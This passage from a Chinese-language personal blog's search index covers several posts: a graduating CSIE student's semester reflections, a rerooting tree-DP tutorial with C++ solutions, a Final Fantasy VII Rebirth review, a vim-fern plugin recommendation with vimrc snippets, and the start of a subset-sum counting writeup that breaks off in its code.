project，不過細節直到期中考考完才知道。\n總之是要寫一個程式做 $N$-bit 的大整數乘法，目標是打贏 GMP 的 mpz_mul，至於要選多大的 $N$ 是自己決定，另外平台是發給我們每個人測的 Raspberry Pi 4，架構是學期當中一直提到的 ARM NEON（跟 online judge 常見的 x86 不一樣）。\nfinal project 的 github repo 跟 報告的 slide 都是公開的所以我就不再寫一次了。大概花了整整兩個禮拜搞這個東西，看到其他人做的之後會覺得我是不是用力過猛了(X\n老師是說只有我是他想像中的作法，他表示可能他定的題目的方向太發散了（？）我看到其他人的作法之後反而覺得自己像是腦筋正攻XD 反正壓得也很有成就感。期末報告結束後因為剛好下午要趕去聚餐就急著離開了，有點「明明應該是感傷的大學最後一堂課但卻弄得我好像很急著離開一樣」的複雜心情。因為 final project 做得好的優越感（？）讓我印象還不錯，不知道以後會不會再開。\nMisc 日K 學期結束後不知道為什麼被一群比我大兩屆以上的人揪去日K。大家都好會唱。不知道為什麼拿了三隻麥克風但一首歌都是一個人唱（各自獨秀）。最後一首歌《再会》是眼皮點的，但他問說其他會唱的要不要拿麥起來唱，然後就是一個超會唱的人（眼皮）和超不會唱的人（我）的合唱。尷尬程度和之前選訓營時 balbit 跟 utaha 揪 jstris 的時候我說要加有的比（？）\n反正我應該努力點滿四個小時的七分之一了，臉皮厚一點也不是壞事，也是有唱得還可以的歌（至少我自己覺得 ODDS \u0026amp; ENDS 應該可以）。\nk033 project 期初跟 casperwang 他們去嘗試做一個量化交易 project（？）不過到了學期中因為比較忙也就沒有參加。感覺在項目剛開始的時候我有點大放厥詞，結果最後要做事的時候都好懶。\nNASA 最一開始這一年度會打算繼續做 NASA 應該是因為感覺更前面那一年我在 NASA 都沒做什麼事的罪惡感。\n今年做起來的感覺是感覺開始上手也開始麻木了，基本上目標是就被動的「讓工作站活著」，然後也很被動的去開月會跟週會。\n我自己的感覺是 NASA 也是一個好多和尚沒水喝的地方。月會簡報跟週會簡報都不知道應該要誰做，好幾次都感覺是我怕真的沒人做簡報跑去做，像膽小鬼賽局一樣。學期的後來我有幾次特意講自己不會去月會或週會然後說好聽一點是傳承說難聽一點感覺像在踢皮球（\n不過我也膽小（或懶惰）而沒有去當一階的 TA 所以搞不好也沒什麼資格講人（？）\n領 NASA 的薪水感覺也很可怕，都像是讓我以後不能選市長的黑歷史。（我沒有要選市長）\n畢業典禮 看到很多平常不會看到的人，拍了幾張照。\n唯一想吐槽的東西是最後的拋帽子環節根本是學士帽大風吹，都不知道最後撿了誰的帽子。\n結束之後跟著一起來的阿公阿嬤去吃飯，阿公請客（？）\n結語 畢業的心得是：\n悲報！ワイ！ニート！\n打完才發現從開始寫心得到現在已經過了一兩個禮拜，好會拖。之後想寫幾篇文章來寫後量子密碼學教的東西，Montgomery 跟後量子那些的。也可以順便推廣一些東西像是 qcoder.jp 或是遊戲（？）\n","permalink":"https://omeletwithoutegg.github.io/2025/06/24/csie-8th-sem/","tags":["CSIE","experience"],"title":"第八學期修課心得"},{"contents":"rerooting / 全方位木 DP 因為最近打 ucup 遇到（有人抱怨他不會）所以想說就來簡單寫一篇小科普。\n大方向來說，前提是根固定時，問題可以用簡單的樹 DP 解決，然後使用換根 DP 的技巧就可以快速計算出「對於所有 $i$，點 $i$ 當根時候的答案」。\nDescription 例題： https://atcoder.jp/contests/dp/tasks/dp_v\n給定一棵 $N$ 個點的樹。對於每個點 $i$，輸出有幾種把 $N$ 個頂點都塗成黑色或白色的方式，使得所有黑色頂點連通，且頂點 $i$ 是黑色的。\n$2 \\leq N \\leq 10^5$\nSolution 我們可以先考慮如果只要輸出 $i = 1$ 的答案該怎麼辦。\n相信大家都會簡單的樹上連通塊的 DP：令 $dp_u$ 代表 $u$ 的子樹裡面有幾種塗色方式使得黑色是一個連通塊且這個子樹的根 $u$ 是黑色的。在一個合法的塗色方案當中，$u$ 已經固定是黑色，而 $u$ 的每個小孩 $v$ 都有兩種情形：黑色或白色，如果是黑色的話方案數是 $dp_v$，若是白色則 $v$ 這個子樹固定是全白的，方案數是 $1$。寫下來就是\n$$\ndp_u = \\prod\\limits _ {v \\in child(u)} (1 + dp_v)\n$$\n接著，如果根從 $1$ 變成 $x$ 了之後，哪些點的 DP 值有變呢？從下面的圖我們可以發現，因為 DP 值是對整個子樹定義的，而圖中紅色和藍色的節點對應的子樹完全沒有變化，所以其實只有 $1$ 和 $x$ 這兩個點的 DP 值有可能會有變化！\n當根從 $x$ 變成一個 $x$ 的鄰居 $y$ 的時候，只有 $x, y$ 兩個頂點的 DP 值會變化，具體來說會像是\n$$\n\\begin{cases}\ndp\u0026rsquo;_x = dp _ x \\cdot \\frac{1}{ 1 + dp_y } \\\\\ndp\u0026rsquo;_y = dp _ y \\cdot (1 + dp\u0026rsquo;_x)\n\\end{cases}\n$$\n因此，我們可以先 DFS 一遍，計算以 $1$ 為根時的整個 DP 陣列。\n接著再跑一遍 DFS，每次遇到一個 $u$ 的小孩 $v$ 可以在 $O(1)$ 的時間（只修改 dp[u] 和 dp[v]）把 DP 陣列改成以 $v$ 為根，這樣我們就可以保證在遍歷到頂點 $u$ 的時候，整個 DP 陣列維護的是以 $u$ 為根對應的 DP 值。當然，要記得在離開 $v$ 之後撤銷這個改動，變回以 $u$ 為根的狀態。\n在上面的論述中，我們假設了一個點拔掉一個小孩或是加上一個小孩之後 DP 值的變化可以快速算出來。在本題中，因為要模的數字 $M$ 不一定是一個質數（而且 $1 + dp_y$ 也可能是 $0$），所以我們不一定每次都可以除。一個常用的技巧是使用前綴和以及後綴和計算「去掉一個小孩之後的乘積」，這個技巧在取 max/min 類或是第 k 大之類的 DP 也可以用，基本上只要有結合律應該就可以想辦法組出來。以下是一個用這個想法完成的實做。\nAC code : 前綴後綴和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef CKISEKI #include \u0026lt;experimental/iterator\u0026gt; #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) void debug_(auto s, auto ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int f = 0; (..., (cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; a)); cerr \u0026lt;\u0026lt; \u0026#34;)\\e[0m\\n\u0026#34;; } void orange_(auto s, auto L, auto R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;33m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; using namespace experimental; copy(L, R, make_ostream_joiner(cerr, \u0026#34;, \u0026#34;)); cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); int N, M; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; M; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g(N); for (int i = 1; i \u0026lt; N; i++) { int u, v; cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v; --u, --v; g[u].push_back(v); g[v].push_back(u); } auto mul = [\u0026amp;M](int64_t a, int64_t b) { return static_cast\u0026lt;int\u0026gt;(a * b % M); }; vector\u0026lt;int\u0026gt; dp(N), ans(N), pre(N), suf(N); auto dfs = [\u0026amp;](auto \u0026amp;\u0026amp;self, int u, int pa) -\u0026gt; void { dp[u] = 1; for (int v : g[u]) { if (v == pa) continue; self(self, v, u); dp[u] = mul(dp[u], 1 + dp[v]); } }; auto reroot = [\u0026amp;](auto \u0026amp;\u0026amp;self, int u, int pa) -\u0026gt; void { ans[u] = dp[u]; // pre[v] 跟 suf[v] 代表從前面和從後面乘到 v 的積， // 乘積裡不包含 v 這一格，而且 **會包含 pa** { int prod = 1; for (int v : g[u]) { pre[v] = prod; prod = mul(prod, 1 + dp[v]); } } { int prod = 1; for (int v : g[u] | views::reverse) { suf[v] = prod; prod = mul(prod, 1 + dp[v]); } } for (int v : g[u]) { if (v == pa) continue; int orig_dpu = dp[u], orig_dpv = dp[v]; dp[u] = mul(pre[v], suf[v]); dp[v] = mul(dp[v], 1 + dp[u]); self(self, v, u); dp[u] = orig_dpu; dp[v] = orig_dpv; } }; dfs(dfs, 0, -1); reroot(reroot, 0, -1); for (int i = 0; i \u0026lt; N; i++) cout \u0026lt;\u0026lt; ans[i] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 另一種想法：下行與上行 另一種比較 pure 的解決本題的想法是這樣的。\n我們改令兩個 DP 陣列 $down_u, up_u$。\n$down_u$ 定義為「以 $1$ 為根時，$u$ 對應的子樹的塗色方法數，限制 $u$ 要是黑色」\n基本上，$down_u$ 的定義和遞迴式和前面的作法的第一輪 DFS 求 $dp_u$ 都差不多。\n$up_u$ 的定義則變成是「以 $1$ 為根時，$u$ 對應的 全方位子樹 的塗色方法數，限制 $pa_u$ 要是黑色」。這裡，$pa_u$ 是以 $1$ 為根時的 parent。而 全方位子樹 的意思是把整棵樹去掉 $u$ 對應的子樹的部份，也就是說那些不是 $u$ 的子孫的點。\n每當遇到一個 $u$ 的小孩 $v$，$up_v$ 可以從 $up_u$ 以及 $u$ 除了 $v$ 以外的小孩的 $down$ 值推出來，大概就像下面畫的這樣：\n也就是說，我們可以遍歷兩次樹，第一次先從葉子開始從下往上計算 $down_u$，第二次則從樹根開始從上往下計算 $up_u$，得出所有 $up_u, down_u$ 之後我們可以把 $up_u, down_u$ 合在一起得出以 $u$ 為根時的答案，在本題的情況是 $(1 + up_u) \\cdot down_u$。比較 tricky 的部份是我們要怎麼定樹根的 $up_u$：在本題中剛好定成 $0$ 可以讓樹根的小孩的 $up_u$ 都是對的，所以歸納地往下計算都是對的；在更一般的問題中，我們可能可以讓樹根的 $up_u$ 往下一層（本題對應到 $+1$）之後剛好變成 identity，或者乾脆不定義，直接對每個樹根的小孩都呼叫 calc_up。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef CKISEKI #include \u0026lt;experimental/iterator\u0026gt; #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) void debug_(auto s, auto ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int f = 0; (..., (cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; a)); cerr \u0026lt;\u0026lt; \u0026#34;)\\e[0m\\n\u0026#34;; } void orange_(auto s, auto L, auto R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;33m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; using namespace experimental; copy(L, R, make_ostream_joiner(cerr, \u0026#34;, \u0026#34;)); cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); int N, M; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; M; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g(N); for (int i = 1; i \u0026lt; N; i++) { int u, v; cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v; --u, --v; g[u].push_back(v); g[v].push_back(u); } auto mul = [\u0026amp;M](int64_t a, int64_t b) { return static_cast\u0026lt;int\u0026gt;(a * b % M); }; vector\u0026lt;int\u0026gt; pa(N); vector\u0026lt;int\u0026gt; down(N); auto calc_down = [\u0026amp;](auto \u0026amp;\u0026amp;self, int u) -\u0026gt; void { down[u] = 1; for (int v : g[u]) { if (v == pa[u]) continue; pa[v] = u; self(self, v); down[u] = mul(down[u], 1 + down[v]); } }; pa[0] = -1; calc_down(calc_down, 0); vector\u0026lt;int\u0026gt; pre(N), suf(N); for (int u = 0; u \u0026lt; N; u++) for (int prod = 1; int v : g[u]) { if (v == pa[u]) continue; pre[v] = prod; prod = mul(prod, 1 + down[v]); } for (int u = 0; u \u0026lt; N; u++) for (int prod = 1; int v : g[u] | views::reverse) { if (v == pa[u]) continue; suf[v] = prod; prod = mul(prod, 1 + down[v]); } vector\u0026lt;int\u0026gt; up(N); up[0] = 0; auto calc_up = [\u0026amp;](auto \u0026amp;\u0026amp;self, int u) -\u0026gt; void { for (int v : g[u]) { if (v == pa[u]) continue; up[v] = mul(1 + up[u], mul(pre[v], suf[v])); self(self, v); } }; calc_up(calc_up, 0); for (int i = 0; i \u0026lt; N; i++) { int ans = mul(1 + up[i], down[i]); cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } 全方位子樹 這個名字我也不知道哪裡來的，只是感覺這樣叫很順。\n參考資料與延伸閱讀 https://drken1215.hatenablog.com/entry/2024/04/15/135700 https://atcoder-tags.herokuapp.com/tags/Dynamic-Programming/Every-Direction-DP https://atcoder.jp/contests/abc220/tasks/abc220_f https://atcoder.jp/contests/dp/tasks/dp_v https://atcoder.jp/contests/abc223/tasks/abc223_g https://atcoder.jp/contests/arc097/tasks/arc097_d https://oi-wiki.org/dp/tree/#%E6%8D%A2%E6%A0%B9-dp https://slides.com/ck1110530/trees#/3 https://codeforces.com/blog/entry/124286 ","permalink":"https://omeletwithoutegg.github.io/2025/04/09/tree-reroot/","tags":["tutorial","tree","dp","dfs","template"],"title":"換根 DP / 全方位木 DP"},{"contents":"最終幻想七 重生 遊玩小記 前情提要 15 年前的 FF7 在 2020 年推出重製版，預計分成三部曲製作。撰文時一二部曲已公開，副標題分別是 remake 和 rebirth。我當然是沒玩過無印版本的 FF7，不過 2023 趁特價買了 FF7 remake 直到 2024 暑假才玩完，剛好 2024 年初 rebirth 也出了。但 rebirth 剛推出的時候是 PS5 獨占，所以直到 2025 年初收到 steam 的通知說 rebirth 要在 PC 上推出了，就把他買下去了。因為算是預購，所以是用大約七折的價格購買的。\n到了發售日的 1/23 終於想要來玩的時候才發現我的 PC 顯卡只有 1060，打開遊戲根本不支援，過了幾天之後問我爸拿到一台他不用的有 4050 的筆電才終於可以玩了。本文不免會有暴雷的問題，以下的部份我就不額外防雷了，若是完全沒玩過想要玩的人建議跳過（？）為了寫這篇小記我查了維基百科但維基百科可沒有防雷，讓我覺得很不開心。\n優點（？） 畢竟我也沒玩過多少 3A 大作（曠野之息算嗎？），所以我覺得他的畫面和 remake 一樣很漂亮。很多建築、載具之類的東西都覺得細節很多很棒。本作（名義上）算是開放世界，因為 remake 完全是在米德加內會覺得地圖就那幾張，剛開始玩 rebirth 經過河的時候我的感想竟然是「可以游泳欸天啊」，一開始會讓人感覺世界真的很大、彷彿很自由，這麼大的世界又這麼美會真的想逛逛。\n遊戲裡面有非常多的小遊戲。其中存在感最大的就是 Queens\u0026rsquo;s blood 女王之血這個卡牌遊戲了，每到一個新的地區不是忙著跑主線而是忙著去找新的對戰者對戰XD。我個人還蠻喜歡這個小遊戲的，容易上手但精通應該不簡單，打贏 NPC 意外的有成就感（？）。\n還有一個很有既視感的小遊戲。在 FF7 remake 裡面是克勞德深蹲，crisis core 裡面是札克斯蹲（我也有在 switch 上玩 CC 所以感覺這像是某種延續傳統），換到 rebirth 變成蒂法仰臥起坐，總之就是一個節奏遊戲，按照時機輪流按四個按鈕。雖然支線任務只有要我們解簡單等級的，但我還是想去挑戰所有難度，最難的難度用 xbox 搖桿按 LT RT LB RB 鍵真的很痛苦，最後改成用鍵盤的鍵位才打贏關主。\n音樂也是一個原版 FF7 就已經存在的賣點。在平原出現的音樂很和平很友善，而在狀況緊急時的音樂就很急促，還有蒂法與艾莉絲的個人 BGM，雖然以我的音樂知識完全說不出什麼東西來，但我覺得他們是有品味的。\n如果是戴耳機玩這個遊戲的話，隊友的聲音會從他們在遊戲裡面的方位傳來，而且離得遠會變小聲。這偶爾會讓我覺得困惑（下面字幕有跳東西但是離得太遠聽不到），但我覺得這是幫沈浸感加分的一個 feature。\n本作是有約會事件的（每個隊友都有！），雖然不能直接看到好感度的數值（二周目好像可以），但會用一個有顏色的圖標來顯示大概。提升好感度主要會是靠主線任務和支線任務，開始的時候常常會提示這是哪個角色的任務，而結束之後會告訴你某個角色的好感度上升了；此外也有一些對話是有選項的，答得好的話好感度會上升比較多。除了約會事件做得很不錯以外，平常的對話互動也會讓人很喜歡，就好像這個角色活生生的一樣（？）順便提醒一下，雖然第八章就是金碟遊樂園了，但約會事件會在第十二章（總共十四章），所以要玩到約會還得花一番功夫。\n劇情部份，主軸就是追著黑斗篷繞世界一圈，重製加進來的一些平行時空或是改變命運之類的情節，我雖然玩過 remake 跟 CC 了但還是有不少覺得很抽象，反正從前作開始他們就開始講玄學台詞了所以我不是很意外終局沒事當謎語人。這也可以解釋成是給玩家一點想像的空間吧，所以我在第三部曲出來之前可能也還是沒辦法評論劇情怎麼樣。\n最後來講戰鬥系統，整個戰鬥系統來說我覺得應該歸類於這款遊戲的優點。rebirth 和 remake 的戰鬥系統幾乎是一樣的，簡單介紹一下的話就是回合制和動作制的混合，基本上普通攻擊、迴避、格檔等都是即時的操作，但按下 A 就可以進入慢動作時間，從選單慢慢選要施放的招式或魔法。常用的招式可以設定到四個快捷鍵裡面，讓戰鬥更加流暢，不過我個人因為並不是特別擅長動作遊戲所以還是習慣從選單選，在慢動作時間可以慢慢想這件事非常棒。施放招式會需要累積行動量表，而 boss 或是比較強的怪物基本上都是需要用招式或是魔法來擊破弱點的，所以這個遊戲可能其實比較像是要一直普攻、閃避跟格檔來累積行動量表，然後主要靠招式的組合來打一波之類的。在本作跟 remake 都常常會使用的招式「洞察」可以顯示敵人的弱點，簡單的弱點會像是弱某種屬性而有些則是要躲避某些敵人的攻擊或是抓時機之類的，打到弱點才容易讓敵人陷入 HEAT 進一步達到 BURST，一連串絲滑連招把敵人帶走。另外本次有新增「聯手招式」，聯手招式除了在戰鬥上很強力以外，演出我也覺得是很帥的地方。聯手招式會需要兩人都施放一定次數的招式才有辦法使用，而且好像也會加好感度（但我覺得無感），所以算是小鼓勵大家切角色去施展招式。不過等級的部份，雖然只能設定三個角色派上場，但沒有上場的角色也會吃到經驗，等級大家一起升這件事真是不切角色的人的福音。\n缺點（？） 雖然很想說顯卡要求是缺點，但好像比較像是自己的缺點。\n然後雖然不是這遊戲的缺點但 xbox 搖桿的 A/B 跟 joycon 是相反的這件事應該讓全世界同時用兩種手把的玩家都很痛苦XD\n第一個會覺得有點煩躁的是視角問題。本作的視角的攝影機在室內的情況下會被強制往角色拉近，因此在許多室內戰鬥的場景就會覺得很難看清楚東西。而且有一個嚴重的問題是忽遠忽近，具體來說像是路上有類似騎樓柱子的東西，我們操控角色在騎樓移動的時候，攝影機從騎樓外往內看就會因為碰上柱子而被強制拉近，然後就會忽遠忽近。\n在室內特別是在搭電梯上下移動的時候，偶爾會出現很可怕的打光，克勞德的整張臉看起來變得很陰間。不知道這是不是 bug，感覺 remake 沒有印象出現這樣的問題。\n前面有說開放世界四個字是名義上的，因為主線實質上還是線性的，每個章節對應到大地圖上的一個區域，你必須要解主線才會開新區域，而且在解主線的途中基本上不能傳送或是回去前面的區域，但解完一個段落或一個章節之後就可以隨時回去前面的區域解支線任務跟區域任務。其實不只是可以解，而是必須去解，要照顧好等級、裝備跟好感度；支線任務的體量比較少而且每個都算是有趣的劇情，但區域任務玩到後面感覺其實有點重複。\n貢加加那邊的地圖超級難探。貢加加是一塊叢林，所以裡面基本上沒有可以沿著走的道路，而且還有幾個區塊被分成不同的高低差。不管是在主線或者支線都會有想要走到地圖上某個點的欲望，但這不是曠野之息所以你不能爬牆也不能風彈，只能用特殊的大蘑菇來從一個點被彈射到另外一個點，但也沒辦法知道想要到某個地方應該從哪個蘑菇開始彈射，所以要找目標只能把附近所有大蘑菇都踩過一遍。\n難度 接著是一些可能我太菜但我覺得「這裡怎麼這麼難」的問題。這可能也跟我後半想要趕緊衝主線就不解支線有關（這就是等級制 MMORPG 的不合理之處）\n在十一章有一段會讓我們主要使用凱特西這個角色，但畢竟我平常也沒有切角色去熟悉這隻，所以我的感覺是打敵人都像在抓癢，而且在這段最後面還塞一個有夠難的 boss 陰陽，被打幾下就要沒血了又很難閃，要回去農等級還得把前面那段全部重跑好麻煩。\n在陰陽前面有一個丟箱子解謎的問題，但這裡的難度不是太難就是太簡單。最一開始要丟到某個地方才能打開某個開關，但可以探索的空間有點太多找了好久才知道要丟哪裡。後面有一個地方是要把箱子丟到一個比較遠的類似籃框的地方，而且他並沒有說清楚要丟在上面的籃框還是下面的籃框，因為有一邊是在動的而且距離有點遠，所以卡了好一陣子，最後亂投投進去一球之後才知道還要做三次。\n最終章要打賽菲羅斯，這章很難的地方在於前面幾章面對的敵人不是可以用洞察（みやぶる）來發現弱點，就是隊友會在你卡了幾次之後提示你應該怎麼打，但這章的每個賽菲羅斯使用洞察之後都不給任何資訊，隊友講的話也也不會教我攻略方法，有不少像是初見殺的東西。舉個例子來說，有一個階段是你要先把 boss 的手臂部位破壞之後才能攻擊核心，但幾乎怎麼攻擊怎麼放招感覺都像是在抓癢，途中才頓悟到是要隨著他手臂的攻擊方式辨識是哪種屬性，並用相剋的屬性魔法打個一兩下就會部位破壞了；這件事情感覺在遊戲前面都沒有出現過，遊戲中敵人的種類和我們能放的魔法的屬性是兩回事，所以我根本不知道雷電和勁風是互相克制，是在這一段才猜出來的。\n接著後面還有一個階段是 boss 會使出讓所有角色都剩下 HP 1 的招式（而且還會用不只一次= =），要在拿到足夠的 ATB 前閃過攻擊的失敗率真的不低。在這個階段卡了好幾輪，最後跑去查資料才知道不同階段之間的力竭量表是共用的，所以因為這個階段特別難，最好在讓前一個階段結束在力竭量表累積到差點滿的狀態，這真的是初見誰會知道呀！\n結語 雖然我噴了這麼多，但問我推不推薦這個遊戲的話我還是會說買來玩就對了，劇情跟美術我覺得都是對得上價格的（特價就更划算:P）。在 remake 上我玩了 34 小時，而在本作我是玩了大概 75 小時，遊戲的內容是真的很豐富。\n","permalink":"https://omeletwithoutegg.github.io/2025/04/02/ff7-rebirth/","tags":["experience"],"title":"Final Fantasy VII Rebirth Review"},{"contents":"推銷 vim-fern 推銷用 vim-fern 取代 NERDTree。我大概是 2023 年初換掉的，現在想說來寫個推銷 post。\n那時候會想要改用 vim-fern 有幾點原因：\n看到 NERDTree 好像要停止更新了的通知。那時候 NERDTree 非常 inactive。 偶爾就會踩到一些怪怪的情況（忘記是什麼了） 那時候在玩 nvim，想要在 nvim 和 vim 兩棲，而大部分查到的 nvim 套件 nvim-tree.lua、neo-tree.nvim、chadtree 都不能在 vim 使用。 原本用 NERDTree 在 startify 的頁面沒有顏色，而在 file explorer 有 換去 vim-fern 之後，覺得有以下幾點優點：\n好看（？）反正就是看起來蠻現代的，而且搭配 fern-renderer-nerdfont.vim 一樣可以有 icon，再配合 glyph-palette.vim 一樣可以有有顏色的 icon。 nvim 和 vim 的界面可以一致 當游標在一個檔案上面的時候，可以按大寫 R 改名，改名會開另一個可以像普通文字一樣編輯的 buffer，而不是在 cmd 那一行只能 backspace 不然就是要用一些不一樣的快捷鍵。 當游標在一個檔案上面的時候，可以按小寫 x 打開 速度蠻快的：在 NERDTree 上面開比較大的 directory 會有有感的延遲，感覺 vim-fern 有改進。 我不確定以上 feature 在 NERDTree 裡面有沒有，但至少我可以在 vim-fern 的 buffer 裡面按 ? 來簡單的看到 cheatsheet 知道可以做什麼動作。 節錄一下 vimrc 相關的部份。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 Plug \u0026#39;hzchirs/vim-material\u0026#39; Plug \u0026#39;itchyny/lightline.vim\u0026#39; Plug \u0026#39;mhinz/vim-startify\u0026#39; Plug \u0026#39;lambdalisue/fern.vim\u0026#39; Plug \u0026#39;lambdalisue/fern-git-status.vim\u0026#39; Plug \u0026#39;lambdalisue/fern-hijack.vim\u0026#39; Plug \u0026#39;lambdalisue/fern-renderer-nerdfont.vim\u0026#39; Plug \u0026#39;lambdalisue/nerdfont.vim\u0026#39; Plug \u0026#39;csch0/vim-startify-renderer-nerdfont\u0026#39; Plug \u0026#39;lambdalisue/glyph-palette.vim\u0026#39; nnoremap \u0026lt;silent\u0026gt; \u0026lt;space\u0026gt;e :Fern . -drawer -toggle\u0026lt;CR\u0026gt; function s:custom_glyph_palette() \u0026#34; hi GlyphPalette0 \u0026#34; black hi GlyphPalette1 guifg=#FF5370 \u0026#34; red hi GlyphPalette2 guifg=#C3E88D \u0026#34; green hi GlyphPalette3 guifg=#FFCB6B \u0026#34; yellow hi GlyphPalette4 guifg=#89DDFF \u0026#34; blue \u0026#34; hi GlyphPalette5 \u0026#34; magenta hi GlyphPalette6 guifg=#82AAFF \u0026#34; cyan hi GlyphPalette7 guifg=#FFFFFF \u0026#34; white \u0026#34; tips: :call glyph_palette#tools#show_palette() endfunction augroup my_glyph_palette autocmd! autocmd ColorScheme * call \u0026lt;SID\u0026gt;custom_glyph_palette() autocmd FileType fern,startify call glyph_palette#apply() augroup END let g:fern#renderer = \u0026#39;nerdfont\u0026#39; augroup fern_custom autocmd! autocmd FileType fern setlocal nonu nornu augroup END augroup hide_vertsplit_background autocmd! autocmd ColorScheme * hi VertSplit cterm=NONE augroup END set fillchars=vert:│ 因為懶得寫另外一篇文章，就順便列前一篇文章沒有列到但我現在覺得不錯用的 plugins。\n1 2 3 4 5 Plug \u0026#39;tpope/vim-surround\u0026#39; Plug \u0026#39;tpope/vim-commentary\u0026#39; \u0026#34; gc for comment Plug \u0026#39;suy/vim-context-commentstring\u0026#39; Plug \u0026#39;tpope/vim-repeat\u0026#39; Plug \u0026#39;editorconfig/editorconfig-vim\u0026#39; ","permalink":"https://omeletwithoutegg.github.io/2025/03/10/vim-fern/","tags":["vim","linux","experience"],"title":"Vim-fern"},{"contents":"♯p Subset Sum : 5e5 Description https://judge.yosupo.jp/problem/sharp_p_subset_sum\n有 $N$ 個小於等於 $T$ 的正整數 $s_0,s_1,\\dots,s_N$，對於所有 $t = 1,2,\\dots,T$，計算有幾個 $I \\subseteq \\{0,1,\\dots,N-1\\}$ 使得 $\\sum _ {i\\in I} s_i = t$，輸出模 $998244353$ 的餘數\n$N, T \\leq 5 \\times 10 ^ 5$\nSolution 從 library-checker 學到的像是冷知識的東西。\n簡單來說就是要算多項式\n$$\nf(x) = \\prod _ {i=0} ^ {N-1} (1 + x^{s_i})\n$$\n的前 $T + 1$ 項係數。\n看到連乘先想能不能多項式分治，但這邊總度數可能會很大。於是我們改對 $f$ 取 log。\n$$\n\\begin{aligned}\n\\log f(x)\n\u0026amp;= \\sum _ {i=0} ^ {N-1} \\log (1 + x^{s_i}) \\\\\n\u0026amp;= \\sum _ {i=0} ^ {N-1} \\sum _ {j=1} ^ \\infty \\frac{(-1)^{j+1}}{j} (x^{s_i})^j \\\\\n\u0026amp;= \\sum _ {i=0} ^ {N-1} \\sum _ {j=1} ^ \\infty \\frac{(-1)^{j+1}}{j} (x^{s_i})^j \\\\\n\u0026amp;= \\sum _ {k=1} ^ T a_k \\sum _ {j=1} ^ \\infty \\frac{(-1)^{j+1}}{j} (x^k)^j \\\\\n\u0026amp;= \\sum _ {k=1} ^ T a_k \\sum _ {j=1} ^ \\infty \\frac{(-1)^{j+1}}{j} x^{kj} \\\\\n\u0026amp;\\equiv \\sum _ {k=1} ^ T a_k \\sum _ {j=1} ^ {\\lfloor T / k \\rfloor} \\frac{(-1)^{j+1}}{j} x^{kj} \\pmod {x^{T+1}} \\\\\n\\end{aligned}\n$$\n其中 $a_k$ 代表有幾個 $s_i = k$。這邊用到 $\\log (1 + x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} - \\frac{x^4}{4} \\cdots$\n照著這個式子我們就可以花 $\\sum _ {1 \\leq k \\leq T} \\lfloor T/k \\rfloor$ 的時間（調和級數！）來得到 $\\log f(x) \\mod x^{T+1}$，再套個多項式 exp 的模板就可以在總時間 $\\mathcal{O}(N + T\\log T)$ 解決本題。\n有關 exp、log 與乘法的關係，比較精準的說明請參考 maspy 的部落格\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 